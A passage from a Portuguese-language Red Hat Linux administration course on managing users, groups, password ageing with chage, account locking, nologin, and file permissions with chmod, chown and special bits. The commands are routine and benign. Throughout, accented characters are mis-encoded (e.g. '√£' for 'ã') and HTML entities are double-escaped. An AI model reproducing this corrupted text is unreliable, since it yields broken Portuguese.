exclu√≠do. Outra solu√ß√£o ser√° atribuir manualmente os arquivos sem propriet√°rio a um usu√°rio diferente. O usu√°rio root pode usar o comando find / -nouser -o -nogroup para localizar todos os arquivos e diret√≥rios sem propriet√°rios. Configura√ß√£o de senhas a partir da linha de comando
O comando passwd username define a senha inicial ou altera a senha existente de username. O usu√°rio root pode configurar uma senha para qualquer valor. Uma mensagem √© exibida se a senha n√£o atender aos crit√©rios m√≠nimos recomendados, mas ser√° seguida por um prompt para redigitar a nova senha, e todos os tokens ser√£o atualizados com √™xito. [root@host ~]# passwd user01 Changing password for user user01. New password: redhat BAD PASSWORD: The password fails the dictionary check - it is based on a dictionary word Retype new password: redhat passwd: all authentication tokens updated successfully. [root@host ~]# Um usu√°rio regular deve escolher uma senha que tenha pelo menos oito caracteres e que n√£o seja baseada em uma palavra do dicion√°rio, no nome de usu√°rio ou na senha anterior. Intervalos de UID
N√∫meros de UID e intervalos de n√∫meros espec√≠ficos s√£o usados para fins determinados pelo Red Hat Enterprise Linux.
A UID 0 sempre √© atribu√≠da √† conta de superusu√°rio, root. As UID de 1 a 200 est√£o no intervalo de &amp;quot;usu√°rios do sistema&amp;quot; atribu√≠dos estaticamente para processos do sistema pela Red Hat. As UIDs de 201 a 999 est√£o no intervalo de &amp;quot;usu√°rios do sistema&amp;quot; usado por processos do sistema que n√£o s√£o propriet√°rios de arquivos no sistema de arquivos. Elas s√£o geralmente atribu√≠das dinamicamente a partir do pool dispon√≠vel quando o software que precisa delas √© instalado. Os programas s√£o executados como esses usu√°rios &amp;quot;sem privil√©gios&amp;quot; do sistema para limitar o acesso apenas aos recursos dos quais eles precisam para funcionar. As UIDs 1000 e superiores est√£o no intervalo dispon√≠vel para atribui√ß√£o a usu√°rios regulares. Gerenciamento de contas de grupos locais Objetivos Depois de concluir esta se√ß√£o, os alunos dever√£o ser capazes de criar, modificar e excluir contas de grupo local. Gerenciamento de grupos locais
Um grupo deve existir antes que um usu√°rio possa ser adicionado a esse grupo. V√°rias ferramentas de linha de comando s√£o usadas para gerenciar contas de grupo locais.
Cria√ß√£o de grupos a partir da linha de comando
O comando groupadd cria grupos. Sem op√ß√µes o comando groupadd usa a pr√≥xima GID dispon√≠vel no intervalo especificado no arquivo /etc/login.defs ao criar os grupos. A op√ß√£o -g especifica uma GID espec√≠fica para o grupo usar. [user01@host ~]$ sudo groupadd -g 10000 group01 [user01@host ~]$ tail /etc/group ...output omitted... group01:x:10000: Nota Dada a cria√ß√£o autom√°tica de grupos privados de usu√°rio (GID &amp;gt;1000), geralmente recomenda-se determinar um intervalo de GIDs a ser usado para grupos suplementares. Um intervalo maior evitar√° uma colis√£o com um grupo do sistema (GID 0-999). A op√ß√£o -r cria um grupo do sistema usando uma GID no intervalo de GIDs de sistema v√°lidos listados no arquivo /etc/login.defs. Os itens de configura√ß√£o SYS_GID_MIN e SYS_GID_MAX em /etc/login.defs definem o intervalo de GIDs do sistema. [user01@host ~]$ sudo groupadd -r group02 [user01@host ~]$ tail /etc/group ...output omitted... group01:x:10000: group02:x:988: Modifica√ß√£o de grupos existentes a partir da linha de comando
O comando groupmod altera as propriedades de um grupo existente. A op√ß√£o -n especifica um novo nome para o grupo. [user01@host ~]$ sudo groupmod -n group0022 group02 [user01@host ~]$ tail /etc/group ...output omitted... group0022:x:988: Observe que o nome do grupo √© atualizado para group0022 de group02. A op√ß√£o -g especifica uma nova GID. [user01@host ~]$ sudo groupmod -g 20000 group0022 [user01@host ~]$ tail /etc/group ...output omitted... group0022:x:20000: Observe que a GID √© atualizada para 20000 de 988. Exclus√£o de grupos a partir da linha de comando
O comando groupdel remove grupos. [user01@host ~]$ sudo groupdel group0022 Nota N√£o √© poss√≠vel remover um grupo se for o grupo principal de qualquer usu√°rio existente. Assim como ocorre com userdel, verifique todos os sistemas de arquivos para garantir que nenhum arquivo permanece no sistema que seja de propriedade do grupo. Altera√ß√£o da associa√ß√£o do grupo na linha de comando
A associa√ß√£o de um grupo √© controlada com o gerenciamento de usu√°rios. Use o comando usermod -g para alterar o grupo principal de um usu√°rio. [user01@host ~]$ id user02 uid=1006(user02) gid=1008(user02) groups=1008(user02) [user01@host ~]$ sudo usermod -g group01 user02 [user01@host ~]$ id user02 uid=1006(user02) gid=10000(group01) groups=10000(group01) Use o comando usermod -aG para adicionar um usu√°rio a um gripo suplementar. [user01@host ~]$ id user03 uid=1007(user03) gid=1009(user03) groups=1009(user03) [user01@host ~]$ sudo usermod -aG group01 user03 [user01@host ~]$ id user03 uid=1007(user03) gid=1009(user03) groups=1009(user03),10000(group01) Importante O uso da op√ß√£o -a passa a fun√ß√£o usermod para o modo acr√©scimo. Sem -a, o usu√°rio ser√° removido de qualquer um dos grupos suplementares atuais que n√£o estejam inclu√≠dos na lista de op√ß√µes -G. Gerenciamento de senhas de usu√°rios Objetivos Depois de concluir esta se√ß√£o, voc√™ poder√° definir uma pol√≠tica de gerenciamento de senha para usu√°rios e bloquear e desbloquear manualmente contas de usu√°rio. Senhas shadow e pol√≠tica de senha
No passado, as senhas criptografadas eram armazenadas no arquivo /etc/passwd, que podia ser lido por todos. Achava-se que isso era razoavelmente seguro at√© que ataques de dicion√°rio a senhas criptografadas se tornaram comuns. A partir da√≠, as senhas criptografadas foram movidas para um arquivo /etc/shadow que s√≥ pode ser lido por root. Esse novo arquivo tamb√©m permitiu a implementa√ß√£o de recursos de vencimento e expira√ß√£o de senhas.
Como /etc/passwd, cada usu√°rio tem uma linha no arquivo /etc/shadow. Uma linha de amostra de /etc/shadow com seus nove campos separados por dois-pontos √© mostrada abaixo.
senhas_shadow.png
Formato de uma senha criptografada
O campo de senha criptografada armazena tr√™s informa√ß√µes: o algoritmo de hashing usado, o sal e o hash criptografado. Cada informa√ß√£o √© delimitada pelo s√≠mbolo $.
shadow_senhas_a2.png
O principal motivo para combinar um salt com a senha √© defender-se contra ataques usando listas pr√©-testadas de hashes de senha. A adi√ß√£o de salts altera os hashes resultantes, tornando a lista previamente computada in√∫til. Se um invasor conseguir obter uma c√≥pia de um arquivo /etc/shadow que est√° usando salts, ele precisar√° executar uma adivinha√ß√£o de senha de for√ßa bruta, exigindo mais tempo e esfor√ßo.
Verifica√ß√£o de senha Quando um usu√°rio tenta fazer login, o sistema procura a entrada do usu√°rio em /etc/shadow, combina o sal para o usu√°rio com a senha n√£o criptografada que foi digitada e a criptografa usando o algoritmo de hash especificado. Se o resultado corresponder ao hash criptografado, o usu√°rio digitou a senha correta. Se o resultado n√£o corresponder ao hash criptografado, o usu√°rio digitou uma senha incorreta, e a tentativa de login falhar√°. Esse m√©todo permite que o sistema determine se o usu√°rio digitou a senha correta sem armazenar a senha de uma forma que ela possa ser copiada para fazer o login.
Configura√ß√£o do vencimento de senha O diagrama a seguir relaciona os par√¢metros de vencimento de senha relevantes que podem ser ajustados usando o comando chage para implementar uma pol√≠tica de vencimento de senha.
shadow_file.png
[user01@host ~]$ sudo chage -m 0 -M 90 -W 7 -I 14 user03
O comando chage anterior usa as op√ß√µes -m, -M, -W e -I para definir a idade m√≠nima, a idade m√°xima, o per√≠odo de aviso e o per√≠odo de inatividade da senha do usu√°rio, respectivamente.
O comando chage -d 0 user03 for√ßa o usu√°rio user03 a atualizar sua senha na pr√≥xima vez que fizer login.
O comando chage -l user03 exibe os detalhes de vencimento de senha de user03.
O comando chage -E 2019-08-05 user03 faz com que a conta do usu√°rio user03 expire em 2019-08-05 (no formato AAAA-MM-DD). Nota
O comando date pode ser usado para calcular uma data no futuro. A op√ß√£o -u informa a hora em UTC.
[user01@host ~]$ date -d &amp;ldquo;&#43;45 days&amp;rdquo; -u Thu May 23 17:01:20 UTC 2019
Edite os itens de configura√ß√£o de vencimento da senha no arquivo /etc/login.defs para definir as pol√≠ticas padr√£o de vencimento de senha. O PASS_MAX_DAYS define a idade m√°xima padr√£o da senha. O PASS_MIN_DAYS define a idade m√≠nima padr√£o da senha. O PASS_WARN_AGE define o per√≠odo de aviso padr√£o da senha. Qualquer altera√ß√£o nas pol√≠ticas de vencimento de senha padr√£o entrar√° em vigor apenas para novos usu√°rios. Os usu√°rios existentes continuar√£o usando as configura√ß√µes antigas de vencimento de senha, em vez de usar as configura√ß√µes novas. Restri√ß√£o de acesso
Voc√™ pode usar o comando chage para definir as datas de vencimento da conta. Quando uma data for atingida, o usu√°rio n√£o poder√° fazer login no sistema interativamente. O comando usermod pode bloquear uma conta com a op√ß√£o -L.
[user01@host ~]$ sudo usermod -L user03 [user01@host ~]$ su - user03 Password: redhat su: Authentication failure
Se um usu√°rio deixar a empresa, o administrador poder√° bloquear e expirar uma conta com um √∫nico comando usermod. A data dever√° ser fornecida como o n√∫mero de dias desde 1970-01-01 ou no formato AAAA-MM-DD.
[user01@host ~]$ sudo usermod -L -e 2019-10-05 user03
O comando usermod anterior usa a op√ß√£o -e para definir a data de vencimento da conta para a conta de usu√°rio especificada. A op√ß√£o -L bloqueia a senha do usu√°rio.
O bloqueio da conta impede que o usu√°rio fa√ßa a autentica√ß√£o com senha no sistema. √â o m√©todo recomendado para evitar o acesso a uma conta por um funcion√°rio que tenha sa√≠do da empresa. Se o funcion√°rio retornar, a conta poder√° posteriormente ser desbloqueada com usermod -U. Se a conta tamb√©m tiver expirado, certifique-se de alterar tamb√©m a data de vencimento.
O shell nologin
O shell nologin funciona como um shell de substitui√ß√£o para as contas de usu√°rio que n√£o pretendem fazer login interativamente no sistema. Do ponto de vista da seguran√ßa, √© inteligente liberar uma conta de fazer login no sistema quando a conta n√£o exige login. Por exemplo, um servidor de e-mail pode exigir uma conta para armazenar mensagens de e-mail e uma senha para o usu√°rio autenticar com um cliente de e-mail usado para obter mensagens. Esse usu√°rio n√£o precisa fazer o login diretamente no sistema.
Uma solu√ß√£o comum para essa situa√ß√£o √© definir o shell de login do usu√°rio como /sbin/nologin. Se o usu√°rio tentar fazer login no sistema diretamente, o shell nologin fecha a conex√£o.
[user01@host ~]$ usermod -s /sbin/nologin user03 [user01@host ~]$ su - user03 Last login: Wed Feb 6 17:03:06 IST 2019 on pts/0 This account is currently not available.
Importante
O shell nologin impede o uso interativo do sistema, mas n√£o evita todo o acesso. Os usu√°rios poder√£o ainda ser capazes de autenticar e enviar ou receber arquivos atrav√©s de aplicativos, como aplicativos web, programas de transfer√™ncia de arquivos ou leitores de e-mail se usarem a senha para autentica√ß√£o do usu√°rio.
Cap√≠tulo 7. Controle de acesso a arquivos Interpreta√ß√£o das permiss√µes do sistema de arquivos Linux Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de listar as permiss√µes do sistema de arquivos em arquivos e diret√≥rios e interpretar o efeito dessas permiss√µes no acesso de usu√°rios e grupos. Permiss√µes do sistema de arquivos Linux
As permiss√µes de arquivo controlam o acesso aos arquivos. As permiss√µes de arquivos Linux s√£o simples, mas flex√≠veis, f√°ceis de compreender e aplicar, sendo ainda capazes de lidar facilmente com a maioria dos casos normais de permiss√£o.
Os arquivos possuem tr√™s categorias de usu√°rio √†s quais as permiss√µes se aplicam. O arquivo √© de propriedade de um usu√°rio, normalmente aquele que o criou. O arquivo tamb√©m √© de propriedade de um √∫nico grupo, geralmente o grupo prim√°rio do usu√°rio que criou o arquivo, mas isso pode ser alterado. Diferentes permiss√µes podem ser definidas para o usu√°rio propriet√°rio, o grupo propriet√°rio e todos os outros usu√°rios do sistema que n√£o sejam nem o usu√°rio, nem o grupo propriet√°rio.
As permiss√µes mais espec√≠ficas t√™m prioridade. As permiss√µes de usu√°rio substituem as permiss√µes de grupo, que substituem outras permiss√µes.
Em Figura 7.1: Exemplo de associa√ß√£o ao grupo para facilitar a colabora√ß√£o, joshua √© membro do grupos joshua e web, e allison √© membro de allison, wheel e web. Quando joshua e allison precisarem colaborar, os arquivos dever√£o ser associados ao grupo web, e as permiss√µes de grupo dever√£o permitir o acesso desejado.
usersandgroups.png
Tr√™s categorias de permiss√µes se aplicam: leitura, grava√ß√£o e execu√ß√£o. A tabela a seguir explica como essas permiss√µes afetam o acesso a arquivos e diret√≥rios.
Tabela 7.1. Efeitos das permiss√µes em arquivos e diret√≥rios
regras_permission.png
Os usu√°rios normalmente t√™m as permiss√µes de leitura e execu√ß√£o em diret√≥rios somente leitura para que possam listar o diret√≥rio e tenham total acesso somente leitura ao conte√∫do dele. Se um usu√°rio s√≥ tiver acesso de leitura em um diret√≥rio, os nomes dos arquivos nele poder√£o ser listados, mas nenhuma outra informa√ß√£o, inclusive permiss√µes e horas/datas de altera√ß√£o, estar√° dispon√≠vel, e eles n√£o poder√£o ser acessados. Se um usu√°rio tiver apenas acesso de execu√ß√£o em um diret√≥rio, ele n√£o poder√° listar os nomes de arquivo no diret√≥rio. Se ele souber o nome de um arquivo que tem permiss√£o para ler, poder√° acessar o conte√∫do desse arquivo de fora do diret√≥rio especificando explicitamente o nome do arquivo relativo.
Um arquivo pode ser apagado por qualquer pessoa que seja propriet√°ria ou tenha permiss√£o de grava√ß√£o no diret√≥rio no qual o arquivo reside, independentemente da propriedade ou das permiss√µes do pr√≥prio arquivo. Isso pode ser substitu√≠do por uma permiss√£o especial, o sticky bit, que ser√° discutida mais adiante neste cap√≠tulo.
Nota As permiss√µes de arquivo do Linux funcionam de maneira diferente do sistema de permiss√µes usado pelo sistema de arquivos NTFS para Microsoft Windows.
No Linux, as permiss√µes se aplicam apenas ao arquivo ou diret√≥rio no qual elas est√£o definidas. Ou seja, as permiss√µes em um diret√≥rio n√£o s√£o herdadas automaticamente pelos subdiret√≥rios e arquivos dentro deles. No entanto, as permiss√µes em um diret√≥rio podem bloquear o acesso ao conte√∫do do diret√≥rio, dependendo de como elas s√£o restritivas.
A permiss√£o read em um diret√≥rio do Linux √© mais ou menos equivalente a Listar conte√∫do da pasta no Windows.
A permiss√£o write em um diret√≥rio do Linux √© equivalente a Modificar no Windows; ela pressup√µe a capacidade de excluir arquivos e subdiret√≥rios. No Linux, se write e sticky bit estiverem definidos em um diret√≥rio, somente o propriet√°rio do arquivo ou do subdiret√≥rio poder√° exclu√≠-lo, o que √© semelhante ao comportamento da permiss√£o Gravar no Windows.
O usu√°rio root do Linux tem o equivalente √† permiss√£o Controle total do Windows em todos os arquivos. No entanto, o root ainda pode ter seu acesso restrito pela pol√≠tica SELinux do sistema usando contextos de seguran√ßa do processo e do arquivo. A SELinux ser√° discutida em um dos pr√≥ximos cursos.
Exibi√ß√£o de permiss√µes e da propriedade de arquivos e diret√≥rios A op√ß√£o -l do comando ls mostra informa√ß√µes mais detalhadas sobre permiss√µes e propriedade:
[user@host~]$ ls -l test -rw-rw-r&amp;ndash;. 1 student student 0 Feb 8 17:36 test
Use a op√ß√£o -d para mostrar informa√ß√µes detalhadas sobre um diret√≥rio em si, e n√£o seu conte√∫do.
[user@host ~]$ ls -ld /home drwxr-xr-x. 5 root root 4096 Jan 31 22:00 /home
O primeiro caractere da listagem longa √© o tipo de arquivo, interpretado assim:
- √© um arquivo regular. d √© um diret√≥rio eu √© um link simb√≥lico. Outros caracteres representam dispositivos de hardware (b e c) ou outros arquivos com fins especiais (p e s). Os pr√≥ximos nove caracteres s√£o as permiss√µes de arquivo. Eles est√£o em tr√™s conjuntos de tr√™s caracteres: permiss√µes que se aplicam ao usu√°rio propriet√°rio do arquivo, ao grupo propriet√°rio do arquivo e todos os outros usu√°rios. Se o conjunto exibir rwx, essa categoria tem as tr√™s permiss√µes, ler, gravar e executar. Se uma letra foi substitu√≠da por -, essa categoria n√£o tem essa permiss√£o.
Ap√≥s a contagem de links, o primeiro nome especifica o usu√°rio propriet√°rio do arquivo e o segundo nome, o grupo propriet√°rio do arquivo.
Ent√£o, no exemplo acima, as permiss√µes para o usu√°rio student s√£o especificados pelo primeiro conjunto de tr√™s caracteres. O usu√°rio student tem permiss√µes de leitura e grava√ß√£o no test, mas n√£o de execu√ß√£o.
O grupo student √© especificado pelo segundo conjunto de tr√™s caracteres: ele tamb√©m tem permiss√µes de leitura e grava√ß√£o no test, mas n√£o de execu√ß√£o.
As permiss√µes de qualquer outro usu√°rio s√£o especificadas pelo terceiro conjunto de tr√™s caracteres: eles s√≥ t√™m permiss√£o de leitura no test.
O conjunto de permiss√µes que vale √© o mais espec√≠fico. Ent√£o, se o usu√°rio student tiver permiss√µes diferentes do grupo student, e o usu√°rio student tamb√©m for um membro desse grupo, as permiss√µes de usu√°rio ser√£o as aplicadas.
Exemplos de efeitos de permiss√£o Os exemplos a seguir ajudar√£o a ilustrar como as permiss√µes de arquivo interagem. Para esses exemplos, temos quatro usu√°rios com as seguintes associa√ß√µes a grupos:
exemplos_permisson.png
Esses usu√°rios estar√£o trabalhando com arquivos no diret√≥rio dir. Essa √© uma listagem longa dos arquivos nesse diret√≥rio:
[database1@host dir]$ ls -la total 24 drwxrwxr-x. 2 database1 consultant1 4096 Apr 4 10:23 . drwxr-xr-x. 10 root root 4096 Apr 1 17:34 .. -rw-rw-r&amp;ndash;. 1 operator1 operator1 1024 Apr 4 11:02 lfile1 -rw-r&amp;ndash;rw-. 1 operator1 consultant1 3144 Apr 4 11:02 lfile2 -rw-rw-r&amp;ndash;. 1 database1 consultant1 10234 Apr 4 10:14 rfile1 -rw-r&amp;mdash;&amp;ndash;. 1 database1 consultant1 2048 Apr 4 10:18 rfile2
A op√ß√£o -a mostra as permiss√µes de arquivos ocultos, incluindo os arquivos especiais usados para representar o diret√≥rio e seu pai. Nesse exemplo, . reflete as permiss√µes de dir em si e .. as permiss√µes do diret√≥rio pai.
Quais s√£o as permiss√µes de rfile1? O usu√°rio propriet√°rio do arquivo (database1) tem permiss√µes de leitura e grava√ß√£o, mas n√£o de execu√ß√£o. O grupo propriet√°rio do arquivo (consultant1) tem permiss√µes de leitura e grava√ß√£o, mas n√£o de execu√ß√£o. Todos os outros usu√°rios t√™m permiss√£o de leitura, mas n√£o de grava√ß√£o ou execu√ß√£o.
A seguinte tabela explora alguns dos efeitos desse conjunto de permiss√µes para esses usu√°rios:
table_p1.png
Gerenciamento de permiss√µes do sistema de arquivos a partir da linha de comando Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de alterar as permiss√µes e as propriedades dos arquivos usando ferramentas de linha de comando. Altera√ß√£o de permiss√µes de arquivo e diret√≥rio
O comando usado para alterar permiss√µes da linha de comando √© chmod, o que significa &amp;ldquo;change mode&amp;rdquo;, alterar modo (as permiss√µes tamb√©m s√£o chamadas de modo de um arquivo). O comando chmod assume uma instru√ß√£o de permiss√£o seguida por uma lista de arquivos ou diret√≥rios a serem alterados. A instru√ß√£o de permiss√£o pode ser emitida simbolicamente (pelo m√©todo simb√≥lico) ou numericamente (pelo m√©todo num√©rico).
Altera√ß√£o de permiss√µes com o m√©todo simb√≥lico
chmod WhoWhatWhich file|directory
Who √© u, g, o, a (referente a usu√°rio, grupo, outros, todos) What √© &#43;, -, = (referente a adi√ß√£o, remo√ß√£o, defini√ß√£o) Which √© r, w, x (referente a leitura, grava√ß√£o, execu√ß√£o) O m√©todo simb√≥lico de alterar permiss√µes de arquivo usa letras para representar os diferentes grupos de permiss√µes: u para usu√°rio, g para grupo, o para outro e a para todos.
Com o m√©todo simb√≥lico, n√£o √© necess√°rio definir um novo grupo de permiss√µes. Em vez disso, voc√™ pode alterar uma ou mais permiss√µes existentes. Use &#43; ou - para adicionar ou remover permiss√µes, respectivamente, ou use = para substituir o conjunto inteiro por um grupo de permiss√µes.
As permiss√µes em si s√£o representadas por uma √∫nica letra: r para leitura, w para grava√ß√£o e x para execu√ß√£o. Quando chmod √© usado para alterar as permiss√µes com o m√©todo simb√≥lico, usar um X mai√∫sculo como sinalizador de permiss√£o somente adicionar√° a permiss√£o de execu√ß√£o se o arquivo for um diret√≥rio ou j√° tiver a execu√ß√£o definida para usu√°rio, grupo ou outro. Nota
O comando chmod √© compat√≠vel com a op√ß√£o -R para definir de maneira recursiva as permiss√µes nos arquivos em uma √°rvore de diret√≥rios inteira. Quando utilizada, a op√ß√£o -R poder√° ser √∫til para definir permiss√µes usando a op√ß√£o X. Isso permite que a permiss√£o de execu√ß√£o (pesquisa) seja definida em diret√≥rios de modo a possibilitar o acesso a seu conte√∫do sem altera√ß√µes de permiss√£o na maioria dos arquivos. Entretanto, Tenha cuidado com a op√ß√£o X, porque se um arquivo tiver definido um conjunto qualquer de permiss√µes de execu√ß√£o, X tamb√©m definir√° para esse arquivo a permiss√£o de execu√ß√£o especificada. Por exemplo, o comando a seguir define recursivamente o acesso de leitura e grava√ß√£o em demodir e todos os seus filhos para o grupo propriet√°rio, mas somente aplica permiss√µes de execu√ß√£o de grupo a diret√≥rios e arquivos que j√° t√™m a execu√ß√£o definida para usu√°rio, grupo ou outro.
[root@host opt]# chmod -R g&#43;rwX demodir
Exemplos
Remova a permiss√£o de leitura e grava√ß√£o para grupo e outro no file1: [user@host ~]$ chmod go-rw file1 Adicione permiss√£o de execu√ß√£o para todos no file2: [user@host ~]$ chmod a&#43;x file2 Altera√ß√£o de permiss√µes com o m√©todo num√©rico
No exemplo abaixo, o caractere # representa um d√≠gito.
chmod ### file|directory
Cada d√≠gito representa permiss√µes para um n√≠vel de acesso: user (usu√°rio), group (grupo), other (outro). O d√≠gito √© calculado adicionando n√∫meros para cada permiss√£o que voc√™ deseja adicionar, 4 para leitura, 2 para grava√ß√£o e 1 para execu√ß√£o. Usando o m√©todo num√©rico, as permiss√µes s√£o representadas por um n√∫mero octal de tr√™s d√≠gitos (ou quatro, ao configurar permiss√µes avan√ßadas). Um √∫nico d√≠gito octal pode representar qualquer valor √∫nico de 0 a 7.
Na representa√ß√£o octal (num√©rica) de tr√™s d√≠gitos, cada d√≠gito representa um n√≠vel de acesso, da esquerda para a direita: usu√°rio, grupo e outro. Para determinar cada d√≠gito:
Comece com 0. Se a permiss√£o de leitura deve estar presente para o n√≠vel de acesso, adicione 4. Se a permiss√£o de grava√ß√£o deve estar presente, adicione 2. Se a permiss√£o de execu√ß√£o deve estar presente, adicione 1. Examine as permiss√µes -rwxr-x&amp;mdash;. Para o usu√°rio, rwx √© calculado como 4&#43;2&#43;1=7. Para o grupo, r-x √© calculado como 4&#43;0&#43;1=5, e para outros usu√°rios, &amp;mdash; √© representado com 0. Colocando esses tr√™s juntos, a representa√ß√£o num√©rica dessas permiss√µes √© 750.
Esse c√°lculo pode tamb√©m ser realizado na dire√ß√£o oposta. Analise as permiss√µes 640. Para as permiss√µes de usu√°rio, 6 representa leitura (4) e grava√ß√£o (2), que √© exibido como rw-. Para a parte do grupo, 4 inclui somente leitura (4) e √© exibido como r&amp;ndash;. O 0 para outro n√£o concede permiss√µes (&amp;mdash;), ent√£o o conjunto final de permiss√µes simb√≥licas para esse arquivo √© -rw-r&amp;mdash;&amp;ndash;.
Os administradores mais experientes geralmente usam permiss√µes simb√≥licas, uma vez que s√£o mais curtas para digitar e pronunciar e, ao mesmo tempo, d√£o controle total sobre todas as permiss√µes.
Exemplos
Defina permiss√µes de leitura e grava√ß√£o para o usu√°rio e leitura para o grupo e outros no samplefile: [user@host ~]$ chmod 644 samplefile Defina permiss√µes de leitura, grava√ß√£o e execu√ß√£o para o usu√°rio, leitura e execu√ß√£o para o grupo e sem permiss√£o para outros no sampledir: [user@host ~]$ chmod 750 sampledir Altera√ß√£o de propriedade de grupo ou usu√°rio do diret√≥rio e arquivo
Um arquivo novo √© de propriedade do usu√°rio que o cria. Por padr√£o, novos arquivos t√™m uma propriedade de grupo que √© o grupo prim√°rio do usu√°rio que criou o arquivo. No Red Hat Enterprise Linux, o grupo prim√°rio de um usu√°rio √© normalmente um grupo privado com apenas esse usu√°rio como um membro. Para conceder acesso a um arquivo com base em associa√ß√£o ao grupo, o grupo propriet√°rio de um arquivo pode precisar ser alterado.
Somente root pode alterar o usu√°rio propriet√°rio de um arquivo. No entanto, a propriedade do grupo pode ser definida pelo root ou pelo propriet√°rio do arquivo. O root pode conceder a propriedade do arquivo a qualquer grupo, mas os usu√°rios regulares s√≥ podem conceder a propriedade se forem membros desse grupo.
A propriedade do arquivo pode ser alterada com o comando chown (alterar propriet√°rio). Por exemplo, para conceder a propriedade do arquivo test_file ao usu√°rio student, use o seguinte comando:
[root@host ~]# chown student test_file
chown pode ser usado com a op√ß√£o -R para alterar recursivamente a propriedade de uma √°rvore de diret√≥rio inteira. O seguinte comando concede a propriedade de test_dir e todos os arquivos e subdiret√≥rios contidos nele a student:
[root@host ~]# chown -R student test_dir
O comando chown tamb√©m pode ser usado para alterar a propriedade do grupo de um arquivo ao preceder o nome do grupo com dois-pontos (:). Por exemplo, o seguinte comando altera a propriedade de grupo do diret√≥rio test_dir para admins:
[root@host ~]# chown :admins test_dir
O comando chown tamb√©m pode ser usado para alterar o propriet√°rio e o grupo ao mesmo tempo usando a sintaxe owner:group. Por exemplo, para alterar a propriedade de test_dir para visitor e o grupo para guests, use o seguinte comando:
[root@host ~]# chown visitor:guests test_dir
Em vez de usar chown, alguns usu√°rios alteram a propriedade do grupo usando o comando chgrp. Esse comando funciona como chown, mas √© usado apenas para alterar a propriedade do grupo e os dois-pontos (:) antes do nome do grupo n√£o s√£o necess√°rios. Importante
Voc√™ pode encontrar exemplos de comandos chown usando uma sintaxe alternativa que separa propriet√°rio e grupo com um ponto em vez de dois-pontos:
[root@host ~]# chown owner.group filename
Voc√™ n√£o deve usar essa sintaxe. Sempre use dois-pontos.
O ponto √© um caractere v√°lido em um nome de usu√°rio, mas dois-pontos n√£o √©. Se o usu√°rio enoch.root , o usu√°rio enoch e o grupo root existirem no sistema, o resultado de chown enoch.root filename ser√° ter filename como propriet√°rio o usu√°rio enoch.root. Talvez voc√™ esteja tentando definir a propriedade do arquivo para o usu√°rio enoch e o grupo root. Isso pode ser confuso.
Se voc√™ sempre usar a sintaxe de dois-pontos chown ao definir o usu√°rio e grupo ao mesmo tempo, os resultados ser√£o sempre f√°ceis de prever.
Gerenciamento de permiss√µes padr√£o e acesso aos arquivos Objetivos Depois de concluir esta se√ß√£o, os alunos dever√£o ser capazes de:
Controlar as permiss√µes padr√£o de novos arquivos criados pelos usu√°rios. Explicar o efeito de permiss√µes especiais. Usar permiss√µes especiais e permiss√µes padr√£o para definir o propriet√°rio do grupo de arquivos criado em um diret√≥rio espec√≠fico. Permiss√µes especiais As permiss√µes especiais constituem um quarto tipo de permiss√£o al√©m dos tipos b√°sicos usu√°rio, grupo e outros. Como o nome indica, essas permiss√µes fornecem recursos relacionados a acesso al√©m do que os tipos b√°sicos de permiss√£o permitem. Esta se√ß√£o detalha o impacto das permiss√µes especiais, resumidas na tabela abaixo.
Tabela 7.2. Efeitos das permiss√µes especiais em arquivos e diret√≥rios
permissoes_p3.png
A permiss√£o setuid em um arquivo execut√°vel significa que os comandos s√£o executados como o usu√°rio que √© propriet√°rio desse arquivo, e n√£o o usu√°rio que executou o comando. Um exemplo √© o comando passwd:
[user@host ~]$ ls -l /usr/bin/passwd -rwsr-xr-x. 1 root root 35504 Jul 16 2010 /usr/bin/passwd
Em uma listagem longa, voc√™ consegue identificar as permiss√µes do setuid por uma letra min√∫scula s onde voc√™ normalmente esperaria que houvesse um x (o propriet√°rio executa permiss√µes). Se o propriet√°rio n√£o tiver permiss√µes de execu√ß√£o, isso √© substitu√≠do por uma letra S mai√∫scula.
A permiss√£o especial setgid em um diret√≥rio significa que os arquivos criados no diret√≥rio herdam a propriedade do grupo do diret√≥rio em vez de herd√°-la do usu√°rio que o criou. Isso √© frequentemente usado em diret√≥rios colaborativos de grupo para alterar de maneira autom√°tica um arquivo do grupo privado padr√£o para o grupo compartilhado, ou se os arquivos em um diret√≥rio precisarem sempre ser de propriedade de um grupo espec√≠fico. Um exemplo disso √© o diret√≥rio /run/log/journal:
[user@host ~]$ ls -ld /run/log/journal drwxr-sr-x. 3 root systemd-journal 60 May 18 09:15 /run/log/journal
Se setgid estiver definido em um arquivo execut√°vel, os comandos s√£o executados como o grupo ao qual o arquivo pertence, e n√£o como o usu√°rio que executou o comando, de maneira semelhante ao setuid. Um exemplo √© o comando locate:
[user@host ~]$ ls -ld /usr/bin/locate -rwx&amp;ndash;s&amp;ndash;x. 1 root slocate 47128 Aug 12 17:17 /usr/bin/locate
Em uma listagem longa, voc√™ consegue identificar as permiss√µes do setgid por uma letra min√∫scula s onde voc√™ normalmente esperaria que houvesse um x (o grupo executa permiss√µes). Se o grupo n√£o tiver permiss√µes de execu√ß√£o, ela √© substitu√≠da por uma letra S mai√∫scula.
Por fim, o sticky bit para um diret√≥rio define uma restri√ß√£o especial na exclus√£o de arquivos. Apenas o propriet√°rio do arquivo (e o root) consegue excluir arquivos dentro do diret√≥rio. Um exemplo √© o /tmp:
[user@host ~]$ ls -ld /tmp drwxrwxrwt. 39 root root 4096 Feb 8 20:52 /tmp
Em uma listagem longa, voc√™ consegue identificar as permiss√µes do sticky por uma letra min√∫scula t onde voc√™ normalmente esperaria que houvesse um x (outros executam permiss√µes). Se outros n√£o tiverem permiss√µes de execu√ß√£o, ela √© substitu√≠da por uma letra T mai√∫scula.
Defini√ß√£o de permiss√µes especiais
Simbolicamente: setuid = u&#43;s ; setgid = g&#43;s; sticky = o&#43;t Numericamente (o quarto d√≠gito da direita para a esquerda): setuid = 4; setgid = 2; sticky = 1 Exemplos
Adicione o bit setgid no directory: [user@host ~]# chmod g&#43;s directory Defina o bit setgid e adicione permiss√µes de leitura/grava√ß√£o/execu√ß√£o ao usu√°rio e grupo, sem acesso para outros, em directory: [user@host ~]# chmod 2770 directory Permiss√µes de arquivo padr√£o Quando voc√™ cria um novo arquivo ou diret√≥rio, ele recebe permiss√µes iniciais. H√° duas coisas que afetam essas permiss√µes iniciais. A primeira √© se voc√™ est√° criando um arquivo regular ou um diret√≥rio. A segunda √© o umask atual.
